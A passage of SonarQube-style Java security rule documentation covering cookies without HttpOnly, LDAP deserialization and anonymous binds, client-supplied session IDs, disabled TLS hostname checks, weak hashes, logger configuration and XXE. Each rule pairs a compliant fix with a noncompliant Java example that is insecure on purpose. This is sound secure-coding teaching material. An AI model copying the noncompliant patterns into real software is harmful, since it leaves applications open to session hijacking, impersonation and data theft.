<p>By default the <a href="https://docs.oracle.com/javaee/6/api/javax/servlet/http/Cookie.html#setHttpOnly(boolean)"><code>HttpOnly</code></a> flag is
set to <em>false:</em></p>
<pre>
Cookie c = new Cookie(COOKIENAME, sensitivedata);  // Sensitive: this sensitive cookie is created with the httponly flag not defined (by default set to false) and so it can be stolen easily in case of XSS vulnerability
</pre>
<h2>Compliant Solution</h2>
<pre>
Cookie c = new Cookie(COOKIENAME, sensitivedata);
c.setHttpOnly(true); // Compliant: this sensitive cookie is protected against theft (HttpOnly=true)
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>
  <li> <a href="https://owasp.org/www-community/HttpOnly">OWASP HttpOnly</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A7_2017-Cross-Site_Scripting_(XSS)">Top 10 2017 Category A7 - Cross-Site Scripting
  (XSS)</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/1004">CWE-1004 - Sensitive Cookie Without 'HttpOnly' Flag</a> </li>
  <li> Derived from FindSecBugs rule <a href="https://find-sec-bugs.github.io/bugs.htm#HTTPONLY_COOKIE">HTTPONLY_COOKIE</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=java:S4434">
              java:S4434
            </a>
          </td>
          <td>
            <details>
              <p>JNDI supports the deserialization of objects from LDAP directories, which can lead to remote code execution.</p>
<p>This rule raises an issue when an LDAP search query is executed with <code>SearchControls</code> configured to allow deserialization.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The application connects to an untrusted LDAP directory. </li>
  <li> User-controlled objects can be stored in the LDAP directory. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It is recommended to disable deserialization of LDAP objects.</p>
<h2>Sensitive Code Example</h2>
<pre>
DirContext ctx = new InitialDirContext();
// ...
ctx.search(query, filter,
        new SearchControls(scope, countLimit, timeLimit, attributes,
            true, // Noncompliant; allows deserialization
            deref));
</pre>
<h2>Compliant Solution</h2>
<pre>
DirContext ctx = new InitialDirContext();
// ...
ctx.search(query, filter,
        new SearchControls(scope, countLimit, timeLimit, attributes,
            false, // Compliant
            deref));
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/">Top 10 2021 Category A8 - Software and Data Integrity
  Failures</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/502">CWE-502 - Deserialization of Untrusted Data</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A8_2017-Insecure_Deserialization">Top 10 2017 Category A8 - Insecure
  Deserialization</a> </li>
  <li> <a href="https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE-wp.pdf">BlackHat
  presentation</a> </li>
  <li> Derived from FindSecBugs rule <a href="https://find-sec-bugs.github.io/bugs.htm#LDAP_ENTRY_POISONING">LDAP_ENTRY_POISONING</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=java:S2257">
              java:S2257
            </a>
          </td>
          <td>
            <details>
              <p>The use of a non-standard algorithm is dangerous because a determined attacker may be able to break the algorithm and compromise whatever data has
been protected. Standard algorithms like <code>SHA-256</code>, <code>SHA-384</code>, <code>SHA-512</code>, …​ should be used instead.</p>
<p>This rule tracks creation of <code>java.security.MessageDigest</code> subclasses.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Use a standard algorithm instead of creating a custom one. </li>
</ul>
<h2>Sensitive Code Example</h2>
<pre>
public class MyCryptographicAlgorithm extends MessageDigest {
  ...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
MessageDigest digest = MessageDigest.getInstance("SHA-256");
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/327">CWE-327 - Use of a Broken or Risky Cryptographic Algorithm</a> </li>
  <li> Derived from FindSecBugs rule <a href="https://h3xstream.github.io/find-sec-bugs/bugs.htm#CUSTOM_MESSAGE_DIGEST">MessageDigest is Custom</a>
  </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=java:S2254">
              java:S2254
            </a>
          </td>
          <td>
            <details>
              <p>This function uses a session ID that is supplied by the client. Because of this, the ID may not be valid or might even be spoofed.</p>
<h2>Why is this an issue?</h2>
<p>According to the API documentation of the <code>HttpServletRequest.getRequestedSessionId()</code> method:</p>
<blockquote>
  <p>Returns the session ID specified by the client. This may not be the same as the ID of the current valid session for this request. If the client
  did not specify a session ID, this method returns null.</p>
</blockquote>
<p>The session ID it returns is either transmitted through a cookie or a URL parameter. This allows an end user to manually update the value of this
session ID in an HTTP request.</p>
<p>Due to the ability of the end-user to manually change the value, the session ID in the request should only be used by a servlet container (e.g.
Tomcat or Jetty) to see if the value matches the ID of an existing session. If it does not, the user should be considered unauthenticated.</p>
<h3>What is the potential impact?</h3>
<p>Using a client-supplied session ID to manage sessions on the server side can potentially have an impact on the security of the application.</p>
<h4>Impersonation (through session fixation)</h4>
<p>If an attacker succeeds in fixing a user’s session to a session identifier that they know, then they can impersonate this victim and gain access to
their account without providing valid credentials. This can result in unauthorized actions, such as modifying personal information, making
unauthorized transactions, or even performing malicious activities on behalf of the victim. An attacker can also manipulate the victim into performing
actions they wouldn’t normally do, such as revealing sensitive information or conducting financial transactions on the attacker’s behalf.</p>
<h2>How to fix it in Java EE</h2>
<h3>Code examples</h3>
<p>In both examples, a session ID is used to check whether a user’s session is still active. In the noncompliant example, the session ID supplied by
the user is used. In the compliant example, the session ID defined by the server is used instead.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
if (isActiveSession(request.getRequestedSessionId())) { // Noncompliant
    // ...
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
if (isActiveSession(request.getSession().getId())) {
    // ...
}
</pre>
<h3>How does this work?</h3>
<p>The noncompliant example uses <code>HttpServletRequest.getRequestedSessionId()</code> to retrieve a session ID. This ID is then used to verify if
the given session is still active. As this value is given by a user, this value is not guaranteed to be a valid ID.</p>
<p>The compliant example instead uses the server’s session ID to verify if the session is active. Additionally, <code>getSession()</code> will create
a new session if the user’s request does not contain a valid ID.</p>
<h2>Resources</h2>
<h3>Documentation</h3>
<ul>
  <li> Jakarta EE Documentation - <a
  href="https://jakarta.ee/specifications/platform/10/apidocs/jakarta/servlet/http/httpservletrequest#getRequestedSessionId--"><code>HttpServletRequest</code> - <code>getRequestedSessionId</code></a> </li>
</ul>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A04_2021-Insecure_Design/">Top 10 2021 Category A4 - Insecure Design</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication">Top 10 2017 Category A2 - Broken Authentication</a>
  </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/807">CWE-807 - Reliance on Untrusted Inputs in a Security Decision</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=java:S4433">
              java:S4433
            </a>
          </td>
          <td>
            <details>
              <p>Lightweight Directory Access Protocol (LDAP) servers provide two main authentication methods: the <em>SASL</em> and <em>Simple</em> ones. The
<em>Simple Authentication</em> method also breaks down into three different mechanisms:</p>
<ul>
  <li> <em>Anonymous</em> Authentication </li>
  <li> <em>Unauthenticated</em> Authentication </li>
  <li> <em>Name/Password</em> Authentication </li>
</ul>
<p>A server that accepts either the <em>Anonymous</em> or <em>Unauthenticated</em> mechanisms will accept connections from clients not providing
credentials.</p>
<h2>Why is this an issue?</h2>
<p>When configured to accept the Anonymous or Unauthenticated authentication mechanism, an LDAP server will accept connections from clients that do
not provide a password or other authentication credentials. Such users will be able to read or modify part or all of the data contained in the hosted
directory.</p>
<h3>What is the potential impact?</h3>
<p>An attacker exploiting unauthenticated access to an LDAP server can access the data that is stored in the corresponding directory. The impact
varies depending on the permission obtained on the directory and the type of data it stores.</p>
<h4>Authentication bypass</h4>
<p>If attackers get write access to the directory, they will be able to alter most of the data it stores. This might include sensitive technical data
such as user passwords or asset configurations. Such an attack can typically lead to an authentication bypass on applications and systems that use the
affected directory as an identity provider.</p>
<p>In such a case, all users configured in the directory might see their identity and privileges taken over.</p>
<h4>Sensitive information leak</h4>
<p>If attackers get read-only access to the directory, they will be able to read the data it stores. That data might include security-sensitive pieces
of information.</p>
<p>Typically, attackers might get access to user account lists that they can use in further intrusion steps. For example, they could use such lists to
perform password spraying, or related attacks, on all systems that rely on the affected directory as an identity provider.</p>
<p>If the directory contains some Personally Identifiable Information, an attacker accessing it might represent a violation of regulatory requirements
in some countries. For example, this kind of security event would go against the European GDPR law.</p>
<h2>How to fix it</h2>
<h3>Code examples</h3>
<p>The following code indicates an anonymous LDAP authentication vulnerability because it binds to a remote server using an Anonymous Simple
authentication mechanism.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
// Set up the environment for creating the initial context
Hashtable&lt;String, Object&gt; env = new Hashtable&lt;String, Object&gt;();
env.put(Context.INITIAL_CONTEXT_FACTORY, "com.sun.jndi.ldap.LdapCtxFactory");
env.put(Context.PROVIDER_URL, "ldap://localhost:389/o=JNDITutorial");

// Use anonymous authentication
env.put(Context.SECURITY_AUTHENTICATION, "none"); // Noncompliant

// Create the initial context
DirContext ctx = new InitialDirContext(env);
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
// Set up the environment for creating the initial context
Hashtable&lt;String, Object&gt; env = new Hashtable&lt;String, Object&gt;();
env.put(Context.INITIAL_CONTEXT_FACTORY, "com.sun.jndi.ldap.LdapCtxFactory");
env.put(Context.PROVIDER_URL, "ldap://localhost:389/o=Example");

// Use simple authentication
env.put(Context.SECURITY_AUTHENTICATION, "simple");
env.put(Context.SECURITY_PRINCIPAL, "cn=local, ou=Unit, o=Example");
env.put(Context.SECURITY_CREDENTIALS, getLDAPPassword());

// Create the initial context
DirContext ctx = new InitialDirContext(env);
</pre>
<h2>Resources</h2>
<h3>Documentation</h3>
<ul>
  <li> <a href="https://datatracker.ietf.org/doc/html/rfc4513#section-5">RFC 4513 - Lightweight Directory Access Protocol (LDAP): Authentication
  Methods and Security Mechanisms</a> - Bind operations </li>
</ul>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/">Top 10 2021 Category A7 - Identification and
  Authentication Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication">Top 10 2017 Category A2 - Broken Authentication</a>
  </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/521">CWE-521 - Weak Password Requirements</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=java:S5527">
              java:S5527
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability allows attackers to impersonate a trusted host.</p>
<h2>Why is this an issue?</h2>
<p>Transport Layer Security (TLS) provides secure communication between systems over the internet by encrypting the data sent between them. In this
process, the role of hostname validation, combined with certificate validation, is to ensure that a system is indeed the one it claims to be, adding
an extra layer of trust and security.</p>
<p>When hostname validation is disabled, the client skips this critical check. This creates an opportunity for attackers to pose as a trusted entity
and intercept, manipulate, or steal the data being transmitted.</p>
<p>To do so, an attacker would obtain a valid certificate authenticating <code>example.com</code>, serve it using a different hostname, and the
application code would still accept it.</p>
<h3>What is the potential impact?</h3>
<p>Establishing trust in a secure way is a non-trivial task. When you disable hostname validation, you are removing a key mechanism designed to build
this trust in internet communication, opening your system up to a number of potential threats.</p>
<h4>Identity spoofing</h4>
<p>If a system does not validate hostnames, it cannot confirm the identity of the other party involved in the communication. An attacker can exploit
this by creating a fake server and masquerading it as a legitimate one. For example, they might set up a server that looks like your bank’s server,
tricking your system into thinking it is communicating with the bank. This scenario, called identity spoofing, allows the attacker to collect any data
your system sends to them, potentially leading to significant data breaches.</p>
<h2>How to fix it in Apache Commons Email</h2>
<h3>Code examples</h3>
<p>The following code contains examples of disabled hostname validation.</p>
<p>The hostname validation gets disabled because <code>setSSLCheckServerIdentity</code> is omitted. To enable validation, set it to
<code>true</code>.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
import org.apache.commons.mail.DefaultAuthenticator;
import org.apache.commons.mail.Email;
import org.apache.commons.mail.SimpleEmail;

public void sendMail(String message) {
    Email email = new SimpleEmail();

    email.setMsg(message);
    email.setSmtpPort(465);
    email.setAuthenticator(new DefaultAuthenticator(username, password));
    email.setSSLOnConnect(true); // Noncompliant

    email.send();
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
import org.apache.commons.mail.DefaultAuthenticator;
import org.apache.commons.mail.Email;
import org.apache.commons.mail.SimpleEmail;

public void sendMail(String message) {
    Email email = new SimpleEmail();

    email.setMsg(message);
    email.setSmtpPort(465);
    email.setAuthenticator(new DefaultAuthenticator(username, password));
    email.setSSLCheckServerIdentity(true);
    email.setSSLOnConnect(true);

    email.send();
}
</pre>
<h3>How does this work?</h3>
<p>To fix the vulnerability of disabled hostname validation, it is strongly recommended to first re-enable the default validation and fix the root
cause: the validity of the certificate.</p>
<h4>Use valid certificates</h4>
<p>If a hostname validation failure prevents connecting to the target server, keep in mind that <strong>one system’s code should not work around
another system’s problems</strong>, as this creates unnecessary dependencies and can lead to reliability issues.</p>
<p>Therefore, the first solution is to change the remote host’s certificate to match its identity. If the remote host is not under your control,
consider replicating its service to a server whose certificate you can change yourself.</p>
<p>In case the contacted host is located on a development machine, and if there is no other choice, try following this solution:</p>
<ul>
  <li> Create a self-signed certificate for that machine. </li>
  <li> Add this self-signed certificate to the system’s trust store. </li>
  <li> If the hostname is not <code>localhost</code>, add the hostname in the <code>/etc/hosts</code> file. </li>
</ul>
<p>Here is a sample command to import a certificate to the Java trust store:</p>
<pre>
keytool -import -alias myserver -file myserver.crt -keystore cacerts
</pre>
<h2>Resources</h2>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>
  <li> OWASP - <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/">Top 10 2021 Category A7 - Identification and
  Authentication Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration">Top 10 2017 Category A6 - Security
  Misconfiguration</a> </li>
  <li> OWASP - <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x10-v5-network_communication_requirements">Mobile AppSec
  Verification Standard - Network Communication Requirements</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m3-insecure-communication">Mobile Top 10 2016 Category M3 - Insecure
  Communication</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/297">CWE-297 - Improper Validation of Certificate with Host Mismatch</a> </li>
  <li> <a
  href="https://wiki.sei.cmu.edu/confluence/display/java/MSC61-J.+Do+not+use+insecure+or+weak+cryptographic+algorithms">https://wiki.sei.cmu.edu/confluence/display/java/MSC61-J.+Do+not+use+insecure+or+weak+cryptographic+algorithms</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=java:S4790">
              java:S4790
            </a>
          </td>
          <td>
            <details>
              <p>Cryptographic hash algorithms such as <code>MD2</code>, <code>MD4</code>, <code>MD5</code>, <code>MD6</code>, <code>HAVAL-128</code>,
<code>HMAC-MD5</code>, <code>DSA</code> (which uses <code>SHA-1</code>), <code>RIPEMD</code>, <code>RIPEMD-128</code>, <code>RIPEMD-160</code>,
<code>HMACRIPEMD160</code> and <code>SHA-1</code> are no longer considered secure, because it is possible to have <code>collisions</code> (little
computational effort is enough to find two or more different inputs that produce the same hash).</p>
<h2>Ask Yourself Whether</h2>
<p>The hashed value is used in a security context like:</p>
<ul>
  <li> User-password storage. </li>
  <li> Security token generation (used to confirm e-mail when registering on a website, reset password, etc …​). </li>
  <li> To compute some message integrity. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Safer alternatives, such as <code>SHA-256</code>, <code>SHA-512</code>, <code>SHA-3</code> are recommended, and for password hashing, it’s even
better to use algorithms that do not compute too "quickly", like <code>bcrypt</code>, <code>scrypt</code>, <code>argon2</code> or <code>pbkdf2</code>
because it slows down <code>brute force attacks</code>.</p>
<h2>Sensitive Code Example</h2>
<pre>
MessageDigest md1 = MessageDigest.getInstance("SHA");  // Sensitive:  SHA is not a standard name, for most security providers it's an alias of SHA-1
MessageDigest md2 = MessageDigest.getInstance("SHA1");  // Sensitive
</pre>
<h2>Compliant Solution</h2>
<pre>
MessageDigest md1 = MessageDigest.getInstance("SHA-512"); // Compliant
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration">Top 10 2017 Category A6 - Security
  Misconfiguration</a> </li>
  <li> OWASP - <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x08-v3-cryptography_verification_requirements">Mobile AppSec
  Verification Standard - Cryptography Requirements</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m5-insufficient-cryptography">Mobile Top 10 2016 Category M5 -
  Insufficient Cryptography</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/1240">CWE-1240 - Use of a Risky Cryptographic Primitive</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=java:S4792">
              java:S4792
            </a>
          </td>
          <td>
            <details>
              <p>This rule is deprecated, and will eventually be removed.</p>
<p>Configuring loggers is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-0285">CVE-2018-0285</a> </li>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2000-1127">CVE-2000-1127</a> </li>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-15113">CVE-2017-15113</a> </li>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5742">CVE-2015-5742</a> </li>
</ul>
<p>Logs are useful before, during and after a security incident.</p>
<ul>
  <li> Attackers will most of the time start their nefarious work by probing the system for vulnerabilities. Monitoring this activity and stopping it
  is the first step to prevent an attack from ever happening. </li>
  <li> In case of a successful attack, logs should contain enough information to understand what damage an attacker may have inflicted. </li>
</ul>
<p>Logs are also a target for attackers because they might contain sensitive information. Configuring loggers has an impact on the type of information
logged and how they are logged.</p>
<p>This rule flags for review code that initiates loggers configuration. The goal is to guide security code reviews.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> unauthorized users might have access to the logs, either because they are stored in an insecure location or because the application gives
  access to them. </li>
  <li> the logs contain sensitive information on a production server. This can happen when the logger is in debug mode. </li>
  <li> the log can grow without limit. This can happen when additional information is written into logs every time a user performs an action and the
  user can perform the action as many times as he/she wants. </li>
  <li> the logs do not contain enough information to understand the damage an attacker might have inflicted. The loggers mode (info, warn, error)
  might filter out important information. They might not print contextual information like the precise time of events or the server hostname. </li>
  <li> the logs are only stored locally instead of being backuped or replicated. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Check that your production deployment doesn’t have its loggers in "debug" mode as it might write sensitive information in logs. </li>
  <li> Production logs should be stored in a secure location which is only accessible to system administrators. </li>
  <li> Configure the loggers to display all warnings, info and error messages. Write relevant information such as the precise time of events and the
  hostname. </li>
  <li> Choose log format which is easy to parse and process automatically. It is important to process logs rapidly in case of an attack so that the
  impact is known and limited. </li>
  <li> Check that the permissions of the log files are correct. If you index the logs in some other service, make sure that the transfer and the
  service are secure too. </li>
  <li> Add limits to the size of the logs and make sure that no user can fill the disk with logs. This can happen even when the user does not control
  the logged information. An attacker could just repeat a logged action many times. </li>
</ul>
<p>Remember that configuring loggers properly doesn’t make them bullet-proof. Here is a list of recommendations explaining on how to use your
logs:</p>
<ul>
  <li> Don’t log any sensitive information. This obviously includes passwords and credit card numbers but also any personal information such as user
  names, locations, etc…​ Usually any information which is protected by law is good candidate for removal. </li>
  <li> Sanitize all user inputs before writing them in the logs. This includes checking its size, content, encoding, syntax, etc…​ As for any user
  input, validate using whitelists whenever possible. Enabling users to write what they want in your logs can have many impacts. It could for example
  use all your storage space or compromise your log indexing service. </li>
  <li> Log enough information to monitor suspicious activities and evaluate the impact an attacker might have on your systems. Register events such as
  failed logins, successful logins, server side input validation failures, access denials and any important transaction. </li>
  <li> Monitor the logs for any suspicious activity. </li>
</ul>
<h2>Sensitive Code Example</h2>
<p>This rule supports the following libraries: Log4J, <code>java.util.logging</code> and Logback</p>
<pre>
// === Log4J 2 ===
import org.apache.logging.log4j.core.config.builder.api.ConfigurationBuilderFactory;
import org.apache.logging.log4j.Level;
import org.apache.logging.log4j.core.*;
import org.apache.logging.log4j.core.config.*;

// Sensitive: creating a new custom configuration
abstract class CustomConfigFactory extends ConfigurationFactory {
    // ...
}

class A {
    void foo(Configuration config, LoggerContext context, java.util.Map&lt;String, Level&gt; levelMap,
            Appender appender, java.io.InputStream stream, java.net.URI uri,
            java.io.File file, java.net.URL url, String source, ClassLoader loader, Level level, Filter filter)
            throws java.io.IOException {
        // Creating a new custom configuration
        ConfigurationBuilderFactory.newConfigurationBuilder();  // Sensitive

        // Setting loggers level can result in writing sensitive information in production
        Configurator.setAllLevels("com.example", Level.DEBUG);  // Sensitive
        Configurator.setLevel("com.example", Level.DEBUG);  // Sensitive
        Configurator.setLevel(levelMap);  // Sensitive
        Configurator.setRootLevel(Level.DEBUG);  // Sensitive

        config.addAppender(appender); // Sensitive: this modifies the configuration

        LoggerConfig loggerConfig = config.getRootLogger();
        loggerConfig.addAppender(appender, level, filter); // Sensitive
        loggerConfig.setLevel(level); // Sensitive

        context.setConfigLocation(uri); // Sensitive

        // Load the configuration from a stream or file
        new ConfigurationSource(stream);  // Sensitive
        new ConfigurationSource(stream, file);  // Sensitive
        new ConfigurationSource(stream, url);  // Sensitive
        ConfigurationSource.fromResource(source, loader);  // Sensitive
        ConfigurationSource.fromUri(uri);  // Sensitive
    }
}
</pre>
<pre>
// === java.util.logging ===
import java.util.logging.*;

class M {
    void foo(LogManager logManager, Logger logger, java.io.InputStream is, Handler handler)
            throws SecurityException, java.io.IOException {
        logManager.readConfiguration(is); // Sensitive

        logger.setLevel(Level.FINEST); // Sensitive
        logger.addHandler(handler); // Sensitive
    }
}
</pre>
<pre>
// === Logback ===
import ch.qos.logback.classic.util.ContextInitializer;
import ch.qos.logback.core.Appender;
import ch.qos.logback.classic.joran.JoranConfigurator;
import ch.qos.logback.classic.spi.ILoggingEvent;
import ch.qos.logback.classic.*;

class M {
    void foo(Logger logger, Appender&lt;ILoggingEvent&gt; fileAppender) {
        System.setProperty(ContextInitializer.CONFIG_FILE_PROPERTY, "config.xml"); // Sensitive
        JoranConfigurator configurator = new JoranConfigurator(); // Sensitive

        logger.addAppender(fileAppender); // Sensitive
        logger.setLevel(Level.DEBUG); // Sensitive
    }
}
</pre>
<h2>Exceptions</h2>
<p>Log4J 1.x is not covered as it has reached <a href="https://blogs.apache.org/foundation/entry/apache_logging_services_project_announces">end of
life</a>.</p>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A09_2021-Security_Logging_and_Monitoring_Failures/">Top 10 2021 Category A9 - Security Logging and
  Monitoring Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A10_2017-Insufficient_Logging%2526Monitoring">Top 10 2017 Category A10 -
  Insufficient Logging &amp; Monitoring</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/117">CWE-117 - Improper Output Neutralization for Logs</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/532">CWE-532 - Information Exposure Through Log Files</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=java:S2755">
              java:S2755
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability allows the usage of external entities in XML.</p>
<h2>Why is this an issue?</h2>
<p>External Entity Processing allows for XML parsing with the involvement of external entities. However, when this functionality is enabled without
proper precautions, it can lead to a vulnerability known as XML External Entity (XXE) attack.</p>
<h3>What is the potential impact?</h3>
<h4>Exposing sensitive data</h4>
<p>One significant danger of XXE vulnerabilities is the potential for sensitive data exposure. By crafting malicious XML payloads, attackers can
reference external entities that contain sensitive information, such as system files, database credentials, or configuration files. When these
entities are processed during XML parsing, the attacker can extract the contents and gain unauthorized access to sensitive data. This poses a severe
threat to the confidentiality of critical information.</p>
<h4>Exhausting system resources</h4>
<p>Another consequence of XXE vulnerabilities is the potential for denial-of-service attacks. By exploiting the ability to include external entities,
attackers can construct XML payloads that cause resource exhaustion. This can overwhelm the system’s memory, CPU, or other critical resources, leading
to system unresponsiveness or crashes. A successful DoS attack can disrupt the availability of services and negatively impact the user experience.</p>
<h4>Forging requests</h4>
<p>XXE vulnerabilities can also enable Server-Side Request Forgery (SSRF) attacks. By leveraging the ability to include external entities, an attacker
can make the vulnerable application send arbitrary requests to other internal or external systems. This can result in unintended actions, such as
retrieving data from internal resources, scanning internal networks, or attacking other systems. SSRF attacks can lead to severe consequences,
including unauthorized data access, system compromise, or even further exploitation within the network infrastructure.</p>
<h2>How to fix it in Java SE</h2>
<h3>Code examples</h3>
<p>The following code contains examples of XML parsers that have external entity processing enabled. As a result, the parsers are vulnerable to XXE
attacks if an attacker can control the XML file that is processed.</p>
<h4>Noncompliant code example</h4>
<pre>
DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance(); // Noncompliant
</pre>
<h4>Compliant solution</h4>
<p>Protection from XXE can be done in several different ways. Choose one depending on how the affected parser object is used in your code.</p>
<p><strong>1.</strong> The first way is to completely disable <code>DOCTYPE</code> declarations:</p>
<pre>
// Applicable to:
// - DocumentBuilderFactory
// - SAXParserFactory
// - SchemaFactory
factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);

// For XMLInputFactory:
factory.setProperty(XMLInputFactory.SUPPORT_DTD, false);
</pre>
<p><strong>2.</strong> Disable external entity declarations completely:</p>
<pre>
// Applicable to:
// - DocumentBuilderFactory
// - SAXParserFactory
factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);

// For XMLInputFactory:
factory.setProperty(XMLInputFactory.IS_SUPPORTING_EXTERNAL_ENTITIES, Boolean.FALSE);
</pre>
<p><strong>3.</strong> Prohibit the use of all protocols by external entities:</p>
<pre>
// `setAttribute` variant, applicable to:
// - DocumentBuilderFactory
// - TransformerFactory
factory.setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, "");
factory.setAttribute(XMLConstants.ACCESS_EXTERNAL_SCHEMA, "");

// `setProperty` variant, applicable to:
// - XMLInputFactory
// - SchemaFactory
factory.setProperty(XMLConstants.ACCESS_EXTERNAL_DTD, "");
factory.setProperty(XMLConstants.ACCESS_EXTERNAL_SCHEMA, "");

// For SAXParserFactory, the prohibition is done on child objects:
SAXParser parser = factory.newSAXParser();
parser.setProperty(XMLConstants.ACCESS_EXTERNAL_DTD, "");
parser.setProperty(XMLConstants.ACCESS_EXTERNAL_SCHEMA, "");
</pre>
<h3>How does this work?</h3>
<h4>Disable external entities</h4>
<p>The most effective approach to prevent XXE vulnerabilities is to disable external entity processing entirely, unless it is explicitly required for
specific use cases. By default, XML parsers should be configured to reject the processing of external entities. This can be achieved by setting the
appropriate properties or options in your XML parser library or framework.</p>
<p>If external entity processing is necessary for certain scenarios, adopt a whitelisting approach to restrict the entities that can be resolved
during XML parsing. Create a list of trusted external entities and disallow all others. This approach ensures that only known and safe entities are
